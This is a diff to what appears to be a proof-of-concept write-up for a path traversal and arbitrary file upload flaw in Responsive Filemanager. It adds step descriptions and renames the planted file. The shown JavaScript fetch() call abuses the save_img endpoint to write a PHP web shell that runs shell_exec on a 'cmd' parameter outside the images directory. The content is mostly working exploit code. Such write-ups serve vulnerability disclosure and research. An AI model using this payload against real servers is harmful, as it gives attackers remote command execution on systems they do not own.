@@ -343,6 +343,7 @@ http://192.168.1.193:8080/admin/includes/modules/filemanager/ajax_calls.php?acti
 
 ![RCE](./img/04.png)
 
+Performs an authenticated HTTP GET request via `fetch()` to the Responsive Filemanager `dialog.php` endpoint, bypassing the restriction observed during conventional browser navigation and obtaining an HTTP 200 OK response.
 
 ### 5- Check status code 200 response 
 
@@ -361,13 +362,15 @@ fetch('/admin/includes/modules/filemanager/ajax_calls.php?action=save_img', {
   headers: {'Content-Type':'application/x-www-form-urlencoded'},
   body: new URLSearchParams({
     path: '',
-    name: '../export/shell.php',
+    name: '../export/smithbraz.php',
     url: 'data:image/png;base64,' + btoa("<?php echo shell_exec($_GET['cmd']); ?>")
   })
 }).then(async r => console.log('HTTP', r.status, await r.text()))
 ```
 
 ![RCE](./img/07.png)
+
+This JavaScript code performs an authenticated HTTP POST request to the Responsive Filemanager `save_img` endpoint, exploiting the Arbitrary File Upload / Path Traversal vulnerability to attempt to write a PHP file outside the images directory.
 
 
 ### 8- Check status code 200 response
